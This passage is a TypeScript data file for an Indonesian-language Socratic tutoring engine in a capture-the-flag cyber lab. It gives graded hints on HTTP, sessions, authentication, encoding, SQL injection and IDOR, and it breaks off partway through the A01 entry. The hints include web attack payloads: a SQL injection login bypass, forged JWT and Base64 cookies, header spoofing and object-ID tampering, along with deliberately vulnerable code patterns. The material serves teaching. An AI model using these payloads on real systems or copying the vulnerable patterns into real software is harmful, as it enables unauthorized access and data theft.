// ZITERA CYBER_LAB — Socratic Cyber Mentor Intelligence Engine
// Serverless, zero-API-cost pedagogical heuristic engine with strict anti-spoiler guardrails.
// Teaches students how to think and investigate rather than spoiling answers.

export type ZetaMood = 'idle' | 'thinking' | 'eureka' | 'warning'

export interface SocraticClue {
  level: 1 | 2 | 3
  title: string
  category: 'Observational' | 'Vulnerability Logic' | 'Payload Blueprint'
  summary: string
  guidance: string
  investigativeQuestions: string[]
  tacticalAction?: string
  codeBlueprint?: string
}

export interface SocraticLabCurriculum {
  labId: string
  labTitle: string
  tacticalRole: string
  missionOverview: string
  clues: [SocraticClue, SocraticClue, SocraticClue]
  keywords: string[]
  suggestedPrompts: string[]
}

export interface SocraticResponse {
  message: string
  mood: ZetaMood
  matchedTopic?: string
  suggestedFollowups: string[]
  antiSpoilerWarning?: boolean
}

export interface LabPayloadBlueprint {
  title: string
  payload: string
  description: string
  targetParam?: string
}

// ── CANONICAL SOCRATIC CURRICULUM DATA (F01..F06, A01..A10, D01..D02, W01..W05) ──

export const SOCRATIC_CURRICULUM_DATA: Record<string, SocraticLabCurriculum> = {
  "F01": {
    "labId": "F01",
    "labTitle": "F01: Dasar Protokol HTTP & Web Architecture",
    "tacticalRole": "Network Protocol & Message Structure Reconnaissance",
    "missionOverview": "Memahami siklus request-response HTTP, struktur header, metode transmisi (GET, POST, dsb), serta bagaimana server memetakan atribut request klien ke logika pemrosesan internal.",
    "keywords": [
      "http",
      "request",
      "response",
      "header",
      "headers",
      "verb",
      "method",
      "get",
      "post",
      "user-agent",
      "content-type",
      "status code",
      "200",
      "404",
      "403",
      "500"
    ],
    "suggestedPrompts": [
      "Parameter atau header apa yang perlu saya amati pertama kali di F01?",
      "Mengapa server mempercayai data dari header klien?",
      "Bagaimana cara memodifikasi HTTP verb dengan curl atau Burp?",
      "Apa implikasi keamanan jika server tidak memvalidasi Content-Type?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemetaan Header & Parameter Request",
        "category": "Observational",
        "summary": "Amati anatomi paket HTTP yang dikirimkan oleh browser atau klien HTTP ke endpoint target.",
        "guidance": "Buka DevTools (F12) Network tab atau Burp Suite HTTP history. Perhatikan secara spesifik: 1) Metode HTTP apa yang digunakan pada endpoint target? 2) Header apa yang mengontrol representasi data (Content-Type, Accept)? 3) Apakah ada header khusus seperti X-Requested-With, Authorization, atau parameter query string yang memicu respons berbeda saat nilainya diubah?",
        "investigativeQuestions": [
          "Apakah server merespons secara berbeda saat User-Agent atau Accept diubah?",
          "Bagaimana respons server terhadap request OPTIONS atau HEAD pada endpoint ini?",
          "Data apa saja yang dikirimkan klien yang sebenarnya berada di luar kendali server?"
        ],
        "tacticalAction": "Kirim request observasi via curl dengan opsi verbose (-v) untuk membaca raw header secara utuh.",
        "codeBlueprint": "curl -v -X GET \"http://127.0.0.1:<PORT>/api/status\" \\\n  -H \"Accept: application/json\" \\\n  -H \"User-Agent: Mozilla/5.0 (Security-Audit-Agent)\""
      },
      {
        "level": 2,
        "title": "Pelanggaran Batas Kepercayaan (Client-Controlled Attributes)",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa mempercayai atribut yang dapat dimanipulasi klien merusak batas keamanan sistem.",
        "guidance": "Arsitektur web sering kali keliru berasumsi bahwa input yang tiba dari browser pasti dihasilkan oleh kode frontend resmi mereka. Jika backend mengandalkan header HTTP khusus klien (seperti header peran buatan, cookie nilai mentah tanpa tanda tangan kriptografis, atau HTTP verb) untuk mengarahkan alur eksekusi, batas kepercayaan (trust boundary) runtuh seketika karena klien HTTP mana pun dapat merekayasa paket tersebut.",
        "investigativeQuestions": [
          "Mengapa validasi di frontend JavaScript tidak pernah dianggap sebagai kontrol keamanan?",
          "Bagaimana backend seharusnya memverifikasi status pengguna secara independen dari header mentah?",
          "Apa bahaya mengizinkan sembarang metode HTTP masuk ke controller sensitif?"
        ],
        "tacticalAction": "Lakukan pengujian HTTP Verb Tampering dengan mengubah request GET menjadi POST atau PUT pada endpoint terkait.",
        "codeBlueprint": "// Vulnerable Logic Pattern:\nif (req.headers[\"x-client-role\"] === \"auditor\" || req.method === \"POST\") {\n  executePrivilegedRoutine();\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru Tampering Parameter & Header",
        "category": "Payload Blueprint",
        "summary": "Struktur template manipulasi request untuk mengekstrak informasi tanpa merusak integritas lingkungan lab.",
        "guidance": "Gunakan Burp Suite Repeater atau curl untuk merekonstruksi request dengan memanipulasi verb dan menyisipkan header konteks. Ingat: jangan mencoba menebak token atau flag secara acak—fokuslah memicu respons server yang membuka status sistem atau variabel diagnostik yang berisi flag pembuktian.",
        "investigativeQuestions": [
          "Apakah respons status berubah dari 403 Forbidden menjadi 200 OK setelah verb diganti?",
          "Apakah body respons menyertakan metadata internal yang sebelumnya disembunyikan?"
        ],
        "tacticalAction": "Kirim request buatan dengan format blueprint di bawah ini melalui terminal lab atau Burp Repeater.",
        "codeBlueprint": "POST /api/v1/diagnostic/inspect HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nX-Forwarded-For: 127.0.0.1\n\n{\n  \"action\": \"protocol_audit\",\n  \"scope\": \"internal_telemetry\"\n}"
      }
    ]
  },
  "F02": {
    "labId": "F02",
    "labTitle": "F02: Cookies, Tokens & Session Security",
    "tacticalRole": "State Management & Stateless Bearer Token Assessment",
    "missionOverview": "Menganalisis mekanisme persistensi status sesi klien-server: flag atribut cookie (HttpOnly, Secure, SameSite), siklus hidup session ID, serta struktur token stateless (JWT/Bearer).",
    "keywords": [
      "cookie",
      "cookies",
      "session",
      "sessionid",
      "token",
      "jwt",
      "bearer",
      "httponly",
      "samesite",
      "secure",
      "fixation",
      "expiry",
      "state"
    ],
    "suggestedPrompts": [
      "Bagaimana cara memeriksa atribut HttpOnly dan Secure pada cookie di browser?",
      "Apa yang terjadi jika session ID tidak di-refresh setelah login berhasil?",
      "Bagaimana cara mendekode token JWT tanpa kunci rahasia?",
      "Di mana titik simpan yang aman untuk token autentikasi di sisi klien?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Inspeksi Header Set-Cookie & Penyimpanan Sesi",
        "category": "Observational",
        "summary": "Petakan header respon Set-Cookie dan inspeksi LocalStorage / SessionStorage di browser.",
        "guidance": "Buka DevTools tab Application -> Cookies dan Storage. Perhatikan: 1) Apakah cookie sesi memiliki flag HttpOnly dicentang? Jika tidak, skrip JavaScript dapat membacanya. 2) Apakah atribut SameSite disetel ke Lax, Strict, atau None? 3) Apakah nilai token berupa string acak (stateful) atau terdiri dari 3 segmen terpisah oleh titik (stateless JWT)?",
        "investigativeQuestions": [
          "Berapa lama masa aktif cookie sesi yang diberikan server?",
          "Apakah nilai cookie berubah setelah logout atau tetap dapat dipakai kembali?",
          "Apakah ada informasi identitas sensitif (seperti role atau email) yang tertulis mentah di dalam nilai cookie?"
        ],
        "tacticalAction": "Gunakan curl untuk menyimpan cookie jar dan memeriksa respons Set-Cookie secara raw.",
        "codeBlueprint": "curl -v -c cookies.txt -b cookies.txt \"http://127.0.0.1:<PORT>/api/auth/session\""
      },
      {
        "level": 2,
        "title": "Kegagalan Invalidation & Session Fixation",
        "category": "Vulnerability Logic",
        "summary": "Identifikasi apakah server gagal memperbarui identitas sesi saat transisi status hak akses.",
        "guidance": "Session Fixation terjadi ketika backend menerima session ID yang sudah ditentukan sebelumnya oleh klien sebelum login, alih-alih menerbitkan ID kriptografis baru setelah verifikasi kredensial. Jika token tidak di-blacklist pada saat logout, penyerang yang memegang token lama dapat terus mengakses akun meskipun korban merasa sudah keluar dari sesi.",
        "investigativeQuestions": [
          "Apakah session ID sebelum login sama persis dengan session ID setelah login berhasil?",
          "Dapatkah token yang sama digunakan secara simultan dari dua alamat IP berbeda tanpa peringatan?"
        ],
        "tacticalAction": "Kirim request ke endpoint terproteksi menggunakan token lama yang telah di-logout di Burp Repeater.",
        "codeBlueprint": "// Vulnerable Session Handler Pattern:\napp.post(\"/login\", (req, res) => {\n  req.session.authenticated = true;\n  req.session.userId = user.id;\n  res.json({ status: \"ok\" });\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Uji Manipulasi Session Token",
        "category": "Payload Blueprint",
        "summary": "Template request manipulasi atribut token untuk menguji ketahanan verifikasi sesi backend.",
        "guidance": "Di Burp Suite Repeater, coba ubah header Cookie dengan menyuntikkan ID sesi alternatif atau memodifikasi payload JWT (pada segmen payload base64) dengan mengubah klaim role menjadi admin. Amati respons server apakah memvalidasi integritas tanda tangan.",
        "investigativeQuestions": [
          "Apakah server mengembalikan 401 saat token rusak, atau malah melempar unhandled exception (500)?",
          "Apakah manipulasi token mengungkap user profile lain?"
        ],
        "tacticalAction": "Kirim request dengan cookie termodifikasi untuk memverifikasi validasi session state.",
        "codeBlueprint": "GET /api/v1/profile/details HTTP/1.1\nHost: 127.0.0.1:<PORT>\nCookie: session_id=guest_active_session_audit_override\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdHVkZW50Iiwicm9sZSI6ImF1ZGl0b3IifQ.\nAccept: application/json"
      }
    ]
  },
  "F03": {
    "labId": "F03",
    "labTitle": "F03: Authentication vs Authorization & Trust Boundaries",
    "tacticalRole": "Identity Verification & Permission Matrix Boundary Audit",
    "missionOverview": "Membedakan prinsip 'siapa Anda' (Autentikasi) dan 'apa yang boleh Anda lakukan' (Otorisasi), serta mengidentifikasi titik kegagalan penegakan kontrol akses pada rute administratif internal.",
    "keywords": [
      "auth",
      "authentication",
      "authorization",
      "authn",
      "authz",
      "permission",
      "role",
      "admin",
      "login",
      "401",
      "403",
      "rbac",
      "privilege",
      "trust boundary"
    ],
    "suggestedPrompts": [
      "Apa perbedaan fundamental antara HTTP 401 Unauthorized dan 403 Forbidden?",
      "Bagaimana server mengetahui apakah pengguna biasa berhak mengakses menu admin?",
      "Mengapa rute API admin sering lupa dipasangi middleware otorisasi?",
      "Bagaimana cara menguji Function-Level Access Control di Burp?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemetaan Matriks Hak Akses & Status Kode",
        "category": "Observational",
        "summary": "Uji respons server terhadap akun tanpa sesi (anonim) vs akun ber-peran rendah.",
        "guidance": "Kirim request ke endpoint administratif seperti /admin, /api/admin/users, atau /api/settings menggunakan dua kondisi: 1) Tanpa header Authorization (ekspektasi: 401 Unauthorized). 2) Dengan token akun siswa reguler. Jika server merespons 200 OK pada akun reguler, otorisasi gagal total. Jika mengembalikan 403, periksa apakah metode HTTP lain (PUT, PATCH, POST) memiliki proteksi serupa.",
        "investigativeQuestions": [
          "Apakah endpoint API memisahkan validasi token (siapa Anda) dengan pengecekan role (apa wewenang Anda)?",
          "Apakah URL admin disembunyikan di menu tampilan atau benar-benar diblokir di tingkat router backend?"
        ],
        "tacticalAction": "Bandingkan respon status code antara rute /user/dashboard dan /admin/telemetry.",
        "codeBlueprint": "curl -s -o /dev/null -w \"%{http_code}\\n\" -H \"Authorization: Bearer <REGULAR_TOKEN>\" \"http://127.0.0.1:<PORT>/api/admin/metrics\""
      },
      {
        "level": 2,
        "title": "Bypass Matriks Otorisasi pada Endpoint Sekunder",
        "category": "Vulnerability Logic",
        "summary": "Pahami fenomena Broken Function Level Authorization di mana developer melindungi frontend tetapi lalai pada API.",
        "guidance": "Banyak sistem modern memproteksi tombol admin di UI menggunakan JavaScript (misal: if (user.role === 'admin') renderAdminButton()). Namun, endpoint backend /api/admin/export sering kali hanya memiliki middleware verifyLogin tanpa menyertakan verifyRole('admin'). Penyerang cukup memanggil URL API langsung via Burp Repeater untuk melewati UI gating.",
        "investigativeQuestions": [
          "Apakah middleware otorisasi diaplikasikan secara global atau manual per rute controller?",
          "Dapatkah parameter role disisipkan pada payload request untuk meng-override izin sementara?"
        ],
        "tacticalAction": "Kirim request langsung ke API admin tersembunyi yang Anda temukan di file JavaScript frontend.",
        "codeBlueprint": "// Vulnerable Route Definition:\nrouter.get(\"/api/admin/export-all\", verifyToken, async (req, res) => {\n  const sensitiveData = await db.exportMasterData();\n  res.json(sensitiveData);\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Probe Function-Level Access Control",
        "category": "Payload Blueprint",
        "summary": "Template request eksplorasi rute administratif dengan kredensial privilege rendah.",
        "guidance": "Di Burp Suite Repeater, pertahankan token autentikasi akun biasa Anda. Ubah path request dari rute reguler menjadi rute diagnostik atau administratif backend. Amati apakah body respons mengembalikan data konfigurasi rahasia atau flag pembuktian.",
        "investigativeQuestions": [
          "Apakah server mengembalikan struktur data sensitif tanpa pengecekan peran?",
          "Apakah ada sub-path seperti /internal/telemetry yang tidak memeriksa sesi?"
        ],
        "tacticalAction": "Kirim probe ke rute administratif dengan header otentikasi aktif Anda.",
        "codeBlueprint": "GET /api/admin/telemetry/overview HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <YOUR_ACTIVE_SESSION_TOKEN>\nX-Requested-With: XMLHttpRequest\nAccept: application/json"
      }
    ]
  },
  "F04": {
    "labId": "F04",
    "labTitle": "F04: Kriptografi Esensial: Encoding vs Hashing vs Enkripsi",
    "tacticalRole": "Cryptographic Primitive Verification & Data Transformation Analysis",
    "missionOverview": "Membongkar miskonsepsi umum dalam keamanan web mengenai perbedaan matematis antara Encoding (reversibel tanpa kunci), Hashing (fungsi satu arah), dan Enkripsi (reversibel dengan kunci kriptografis).",
    "keywords": [
      "crypto",
      "kripto",
      "kriptografi",
      "encoding",
      "base64",
      "hex",
      "hash",
      "hashing",
      "md5",
      "sha",
      "sha256",
      "enkripsi",
      "encryption",
      "aes",
      "salt",
      "prng"
    ],
    "suggestedPrompts": [
      "Mengapa Base64 bukan bentuk enkripsi atau pengamanan data?",
      "Bagaimana cara membedakan string Base64, Hexadecimal, dan Hash SHA-256?",
      "Mengapa hash kata sandi tanpa salt mudah dipecahkan dengan Rainbow Table?",
      "Apa yang membuat algoritma enkripsi rentan terhadap serangan manipulasi teks?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Format Representasi Data",
        "category": "Observational",
        "summary": "Analisis karakteristik panjang karakter, karakter set, dan padding pada token atau string target.",
        "guidance": "Perhatikan format string yang Anda temukan di parameter cookie, token, atau respons JSON: 1) String dengan karakter A-Z, a-z, 0-9, serta karakter padding '=' atau '==' di akhir hampir pasti adalah Base64. 2) String 32 karakter hexadecimal (0-9, a-f) adalah representasi tipikal hash MD5. 3) String 64 karakter hex adalah SHA-256. Gunakan terminal untuk mendecode string tersebut langsung.",
        "investigativeQuestions": [
          "Apakah string yang Anda amati memiliki tanda padding '=' di bagian belakang?",
          "Jika didecode dari Base64, apakah isinya berupa teks biasa atau JSON terstruktur?"
        ],
        "tacticalAction": "Jalankan decoding Base64 di terminal untuk melihat teks asli di balik payload.",
        "codeBlueprint": "echo \"WklURVJBe2V4YW1wbGVfdG9rZW5fcHJvYmV9\" | base64 --decode"
      },
      {
        "level": 2,
        "title": "Ilusi Keamanan Reversibel (Encoding as Obfuscation)",
        "category": "Vulnerability Logic",
        "summary": "Pahami bahaya fatal developer yang menyimpan kredensial atau peran hanya dengan Base64 atau XOR sederhana.",
        "guidance": "Banyak pengembang keliru menganggap bahwa mengubah data menjadi Base64 sudah cukup untuk merahasiakannya dari pengguna. Karena Base64 adalah algoritma encoding publik tanpa kunci rahasia, siapa pun dapat membalikkan proses tersebut dalam hitungan milidetik. Jika peran pengguna disimpan sebagai role=dXNlcg== (Base64 dari 'user'), penyerang cukup menggantinya dengan YWRtaW4= (Base64 dari 'admin').",
        "investigativeQuestions": [
          "Apakah ada cookie atau parameter input yang nilainya jika di-decode merepresentasikan role atau user_id?",
          "Bagaimana cara membuktikan bahwa fungsi hash satu arah membutuhkan salt untuk mencegah lookup dictionary?"
        ],
        "tacticalAction": "Ubah teks yang didecode lalu encode kembali untuk dikirimkan ke server.",
        "codeBlueprint": "// Vulnerable Trust Pattern:\nconst clientRole = Buffer.from(req.cookies.user_role, \"base64\").toString(\"utf-8\");\nif (clientRole === \"admin\") {\n  grantSuperuser();\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru Rekonstruksi Payload Kriptografis",
        "category": "Payload Blueprint",
        "summary": "Template pengujian modifikasi token Base64 untuk mengevaluasi validasi integritas backend.",
        "guidance": "Buat payload Base64 baru yang berisi teks objek atau peran target. Sisipkan payload hasil encode tersebut ke dalam parameter atau cookie yang relevan di Burp Repeater, lalu amati apakah server menerimanya tanpa validasi tanda tangan kriptografis.",
        "investigativeQuestions": [
          "Apakah backend menolak payload atau langsung mengadaptasi status peran baru?",
          "Apakah respons server memunculkan data rahasia setelah token dimodifikasi?"
        ],
        "tacticalAction": "Kirim cookie dengan nilai Base64 peran target yang telah di-encode.",
        "codeBlueprint": "GET /api/v1/vault/secret-archive HTTP/1.1\nHost: 127.0.0.1:<PORT>\nCookie: user_auth_state=eyJhZG1pbiI6dHJ1ZSwidXNlciI6InNlY3VyaXR5X2F1ZGl0b3IifQ==\nAccept: application/json\n\n// Catatan Blueprint: Base64 di atas adalah {\"admin\":true,\"user\":\"security_auditor\"}"
      }
    ]
  },
  "F05": {
    "labId": "F05",
    "labTitle": "F05: Dasar Query Database & Pemisahan Data/Perintah",
    "tacticalRole": "Database Syntax Disruption & Injection Mechanics Assessment",
    "missionOverview": "Mempelajari bagaimana basis data relasional (SQL) mengeksekusi instruksi, memahami bahaya konkatenasi string dinamis, dan menganalisis mengapa pemisahan data dengan perintah (Prepared Statements) adalah solusi mutlak.",
    "keywords": [
      "sql",
      "database",
      "query",
      "injection",
      "sqli",
      "syntax",
      "quote",
      "concatenation",
      "prepared statement",
      "parameterized",
      "select",
      "where",
      "or",
      "union",
      "error"
    ],
    "suggestedPrompts": [
      "Bagaimana cara membedakan input data biasa dengan karakter pemutus query SQL?",
      "Apa yang terjadi di dalam database saat karakter tanda petik disisipkan ke form login?",
      "Mengapa OR 1=1 bisa membuat verifikasi password diabaikan oleh database?",
      "Bagaimana Prepared Statement mencegah penafsiran input sebagai perintah kode?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Observasi Perilaku Parsing Karakter Khusus",
        "category": "Observational",
        "summary": "Sisipkan karakter kontrol sintaks SQL pada form input dan amati respons error server.",
        "guidance": "Buka halaman login atau pencarian di lab F05. Masukkan karakter metakarakter SQL tunggal seperti tanda petik satu ('), tanda petik dua (\"), atau backslash (\\). Amati respon server: Apakah aplikasi mengembalikan pesan kesalahan database eksplisit seperti 'SQLite3::SQLException: unrecognized token' atau HTTP 500? Jika ya, input Anda dimasukkan langsung ke parser query.",
        "investigativeQuestions": [
          "Apakah halaman merespons secara berbeda antara input kata biasa dengan input yang mengandung tanda petik?",
          "Apakah ada pesan error database yang membeberkan struktur query SQL backend?"
        ],
        "tacticalAction": "Kirim input karakter penguji via form pencarian atau parameter URL.",
        "codeBlueprint": "curl -s \"http://127.0.0.1:<PORT>/api/catalog/search?q='\" | grep -iE \"sql|syntax|database|error\""
      },
      {
        "level": 2,
        "title": "Pencampuran Konteks Data dan Konteks Perintah",
        "category": "Vulnerability Logic",
        "summary": "Pahami kegagalan arsitektur di mana string input klien mengubah struktur pohon sintaks (AST) query.",
        "guidance": "SQL Injection bukan masalah database yang lemah, melainkan kesalahan cara backend menyusun perintah. Saat programmer menulis string konkatenasi: \"SELECT * FROM users WHERE user = '\" + input + \"'\", mereka mencampuradukkan data masukan klien dengan perintah SQL. Ketika klien mengirim admin' --, query berubah sehingga bagian validasi password diabaikan sebagai komentar.",
        "investigativeQuestions": [
          "Mengapa sanitasi tanda petik dengan fungsi regex sering kali dapat di-bypass?",
          "Bagaimana parameterisasi SQL (Prepared Statements) memperlakukan masukan selalu sebagai nilai literal murni?"
        ],
        "tacticalAction": "Pelajari perbedaan konstruksi query rentan vs query aman pada cetak biru di bawah.",
        "codeBlueprint": "// Vulnerable Concatenation:\nconst query = \"SELECT * FROM users WHERE username = '\" + req.body.username + \"' AND password = '\" + req.body.password + \"'\";\n\n// Secure Parameterization:\nconst safeQuery = \"SELECT * FROM users WHERE username = ? AND password = ?\";\nawait db.query(safeQuery, [req.body.username, req.body.password]);"
      },
      {
        "level": 3,
        "title": "Cetak Biru Sintaks Bypass Logika Autentikasi",
        "category": "Payload Blueprint",
        "summary": "Struktur manipulasi ekspresi boolean untuk membuktikan kegagalan pemisahan konteks query.",
        "guidance": "Di form autentikasi atau Burp Suite Repeater, gunakan struktur payload pemutus logika boolean. Tujuan pengujian ini adalah memaksa klausa WHERE selalu bernilai TRUE tanpa memerlukan password sah, sehingga server mengambil record pengguna administratif pertama.",
        "investigativeQuestions": [
          "Apakah respons login mengembalikan status sukses atau token sesi tanpa password yang valid?",
          "Apakah simbol komentar database yang sesuai adalah -- (standar) atau # (MySQL)?"
        ],
        "tacticalAction": "Kirim request autentikasi terstruktur dengan payload pemutus logika boolean.",
        "codeBlueprint": "POST /api/auth/login HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\n\n{\n  \"username\": \"admin' OR '1'='1' --\",\n  \"password\": \"arbitrary_probe_password\"\n}"
      }
    ]
  },
  "F06": {
    "labId": "F06",
    "labTitle": "F06: Mekanisme Lab ZITERA & Pengiriman Flag CTF",
    "tacticalRole": "Cyber Range Verification & Enclave Protocol",
    "missionOverview": "Menguasai arsitektur pengujian laboratorium ZITERA, siklus container enclave, serta mekanisme validasi bukti eksploitasi (Capture The Flag) berstandar industri.",
    "keywords": [
      "flag",
      "ctf",
      "zitera{",
      "submit",
      "verifikasi",
      "enclave",
      "container",
      "docker",
      "token",
      "hash",
      "bukti",
      "challenge"
    ],
    "suggestedPrompts": [
      "Bagaimana format resmi penyerahan flag di ZITERA LAB?",
      "Di mana flag biasanya diekspos setelah eksploitasi berhasil?",
      "Mengapa flag saya dianggap tidak valid saat di-submit?",
      "Bagaimana cara memastikan container lab berada dalam status siap?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Pola Output & Endpoint Verifikasi",
        "category": "Observational",
        "summary": "Kenali format pembungkus flag deterministik dan lokasi verifikasi bukti.",
        "guidance": "Semua laboratorium di ZITERA LAB menggunakan pembungkus bukti eksploitasi seragam. Perhatikan: 1) Format flag selalu diawali dengan prefix ZITERA{ dan diakhiri dengan tanda kurung kurawal penutup }. 2) Di dalam terminal interaktif atau respons HTTP, flag biasanya muncul setelah kondisi kerentanan terpenuhi. 3) Buka tab Challenge / Verifikasi di panel kontrol laboratorium untuk menemukan form submission.",
        "investigativeQuestions": [
          "Apakah output terminal atau respons JSON mengandung string yang diawali prefix ZITERA{?",
          "Apakah Anda telah mencatat seluruh string token termasuk tanda kurung kurawal?",
          "Apakah container laboratorium berada dalam status RUNNING (hijau)?"
        ],
        "tacticalAction": "Gunakan utilitas grep di terminal untuk mencari pola ekspresi reguler flag.",
        "codeBlueprint": "grep -oE \"ZITERA\\{[A-Za-z0-9_\\-]+\\}\" /tmp/execution.log || echo \"Flag belum diekspos.\""
      },
      {
        "level": 2,
        "title": "Integritas Pembuktian Eksploitasi & State Verification",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa flag terikat pada kondisi eksploitasi dan sesi aktif container.",
        "guidance": "Flag ZITERA bukan sekadar kata sandi statis, melainkan representasi kriptografis bahwa Anda berhasil mengeksekusi urutan taktis yang diminta. Engine verifikasi backend memvalidasi hash flag terhadap session ID unik container Anda. Jika Anda mencoba men-submit flag yang ditemukan di internet atau dari sesi laboratorium lama yang telah di-reset, verifier akan menolaknya karena signature tidak sinkron.",
        "investigativeQuestions": [
          "Mengapa container yang di-reset menghasilkan instance baru dengan sesi berbeda?",
          "Bagaimana backend memverifikasi bahwa flag diperoleh dari pemicu eksploitasi nyata?",
          "Apa perbedaan antara flag tantangan dan kredensial login akun pengguna?"
        ],
        "tacticalAction": "Periksa status runtime lab melalui tab Diagnostics atau panel Kontrol Kontainer sebelum melakukan submit.",
        "codeBlueprint": "// Verifier Logic Architecture:\nconst expectedToken = hmacSha256(containerSessionId + labId, enclaveMasterKey);\nif (submittedToken !== expectedToken) {\n  throw new VerificationError(\"TOKEN_SESSION_MISMATCH: Restart atau selesaikan eksploitasi ulang.\");\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru Ekstraksi Bukti & Format Submit",
        "category": "Payload Blueprint",
        "summary": "Prosedur standar ekstraksi dan verifikasi bukti tanpa membocorkan nilai hash spesifik.",
        "guidance": "Setelah Anda mengeksekusi payload eksploitasi dan melihat string dengan format ZITERA{...}, salin nilai tersebut dengan teliti tanpa menyertakan spasi di awal atau akhir. Buka panel Submission pada detail lab, tempelkan nilai tersebut, dan tekan tombol Verifikasi. Jika verifikasi berhasil, status tantangan akan berubah menjadi SOLVED dan skor Anda akan dicatat di scoreboard lokal.",
        "investigativeQuestions": [
          "Apakah Anda memastikan tidak ada karakter spasi atau newline yang terselip saat menyalin?",
          "Apakah status jaringan lokal Anda stabil saat mengirimkan submission?"
        ],
        "tacticalAction": "Verifikasi format flag dengan validator di bawah sebelum menekan tombol Kirim.",
        "codeBlueprint": "// Format baku submission:\nFlagFormat: ZITERA{alphanumeric_or_hex_token_here}\n\nPOST /api/v1/challenge/verify\nBody: { \"lab_id\": \"F06\", \"flag\": \"ZITERA{...}\" }"
      }
    ]
  },
  "A01": {
    "labId": "A01",
    "labTitle": "A01: Broken Access Control (VaultPay Enterprise IDOR)",
    "tacticalRole": "Authorization Boundary & Tenant Isolation Analysis",
    "missionOverview": "Menganalisis kegagalan kontrol akses horizontal (Insecure Direct Object Reference / IDOR) pada portal finansial multi-tenant VaultPay Enterprise, di mana penyerang dapat mengakses invoice rahasia milik pengguna lain.",
    "keywords": [
      "idor",
      "bola",
      "access control",
      "broken access",
      "authorization",
      "vaultpay",
      "invoice",
      "document",
      "account_id",
      "doc_id",
      "tenant",
      "privilege",
      "horizontal"
    ],
    "suggestedPrompts": [
      "Bagaimana cara menemukan parameter IDOR pada VaultPay Enterprise?",
      "Kenapa pengguna sah bisa mengakses invoice orang lain?",
      "Bagaimana membedakan otentikasi (401) dan otorisasi (403)?",
      "Apa payload template untuk menguji IDOR di Burp Suite Repeater?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemeriksaan Parameter Objek Langsung (Direct Object Reference)",
        "category": "Observational",
        "summary": "Telusuri parameter identifikasi numerik atau ID referensi pada URL dan body request.",
        "guidance": "Masuk ke portal VaultPay menggunakan akun pengguna standar yang diberikan. Navigasikan ke menu Transaksi atau Riwayat Invoice. Buka DevTools Network tab atau Burp Suite HTTP history. Amati request yang terjadi saat Anda melihat invoice Anda sendiri: apakah ada endpoint seperti /api/documents/{id}, /api/invoices?doc_id=1001, atau /api/users/profile? Perhatikan apakah ID tersebut berupa angka berurutan (inkremental) yang mudah ditebak.",
        "investigativeQuestions": [
          "Berapa nilai ID dokumen invoice milik akun Anda saat ini?",
          "Apakah ada pola angka berurutan seperti 1001, 1002, 1003?",
          "Apakah Anda melihat indikator kepemilikan dokumen di URL atau body JSON?"
        ],
        "tacticalAction": "Kirim request sah melihat dokumen milik sendiri ke Burp Suite Repeater dengan menekan Ctrl+R.",
        "codeBlueprint": "GET /api/documents/download?doc_id=1001 HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <STUDENT_JWT_TOKEN>\nAccept: application/json"
      },
      {
        "level": 2,
        "title": "Pemisahan Autentikasi vs Otorisasi",
        "category": "Vulnerability Logic",
        "summary": "Pahami kegagalan arsitektur di mana backend memvalidasi siapa Anda, tetapi lupa memeriksa hak Anda atas objek.",
        "guidance": "Aplikasi VaultPay dengan benar memeriksa apakah Anda telah login (autentikasi berhasil melalui token JWT atau session cookie). Namun, saat query basis data dijalankan untuk mengambil invoice, backend hanya mengeksekusi query naif: SELECT * FROM invoices WHERE id = :doc_id. Backend sama sekali TIDAK menyertakan filter relasi kepemilikan: AND user_id = :session_user_id. Akibatnya, siapapun yang memiliki akun login yang sah dapat membaca dokumen rahasia milik pengguna lain hanya dengan mengganti nomor ID.",
        "investigativeQuestions": [
          "Mengapa pemeriksaan login saja tidak cukup untuk melindungi data pengguna?",
          "Apa yang membedakan eskalasi hak istimewa horizontal (antar user selevel) dan vertikal (user ke admin)?",
          "Bagaimana pengembang seharusnya menulis query database yang aman dari IDOR?"
        ],
        "tacticalAction": "Ganti nilai doc_id di Burp Repeater dengan ID sebelum atau sesudah nomor invoice Anda.",
        "codeBlueprint": "// Vulnerable Backend Implementation:\napp.get(\"/api/documents/download\", authenticateToken, async (req, res) => {\n  const docId = req.query.doc_id;\n  const doc = await db.query(\"SELECT * FROM invoices WHERE id = ?\", [docId]);\n  if (!doc) return res.status(404).send(\"Document not found\");\n  return res.json(doc);\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Tampering ID Objek & Ekstraksi Dokumen Sasaran",
        "category": "Payload Blueprint",
        "summary": "Struktur request manipulasi ID target untuk mengekstrak invoice administratif tanpa merusak data.",
        "guidance": "Di Burp Suite Repeater, pertahankan token Authorization sah milik akun Anda. Kemudian ubah nilai identifier target ke ID yang dicurigai menyimpan invoice rahasia manajemen (misalnya ID 1000, 1002, atau ID administratif awal). Kirim request dan telaah responsnya: apakah data transaksi milik nasabah lain muncul beserta flag pembuktian keberhasilan audit?",
        "investigativeQuestions": [
          "Berapa ID dokumen target yang mengembalikan status 200 OK dengan data milik eksekutif?",
          "Apakah dokumen tersebut memuat token bukti ZITERA{...} di dalam rincian transaksi?"
        ],
        "tacticalAction": "Lakukan uji tamper parameter ID secara terkontrol menggunakan template di bawah.",
